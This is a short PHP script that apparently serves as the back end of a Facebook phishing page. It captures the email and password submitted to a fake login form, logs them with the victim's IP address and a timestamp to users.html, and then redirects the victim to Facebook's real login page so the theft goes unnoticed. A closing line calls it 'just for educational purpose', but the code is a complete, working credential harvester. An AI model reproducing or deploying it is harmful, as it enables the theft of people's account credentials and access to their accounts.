<?php
error_reporting(0);

$usuario = $_POST['email'];  //Here we bring the data written in the text field of login.html - the field id: user
$clave = $_POST['pass']; //Here we bring the data written in the text field of login.html - the field id: clave
$ip = $_SERVER['REMOTE_ADDR']; //The public ip is captured where the page is accessed
$fecha = date("Y-m-d;h:i:s"); //The time at which the data was entered is captured
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: https://www.facebook.com/'); // Verification code that is not empty fields
}else{

function curPageURL() {
$pageURL = 'http';
if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
$pageURL .= "://";
if ($_SERVER["SERVER_PORT"] != "80") {
  $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
} else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
}
return $pageURL;
}

//In this portion of code is where the .html files are generated with the data captured on the login.html page
$f = fopen("users.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//After the key file.html is created with the data, it is directed to the official instagram page
header("Location:  https://www.facebook.com/login.php?login_attempt=1&lwv=100");
}
?>
 
 
 
//this is just for educational purpose
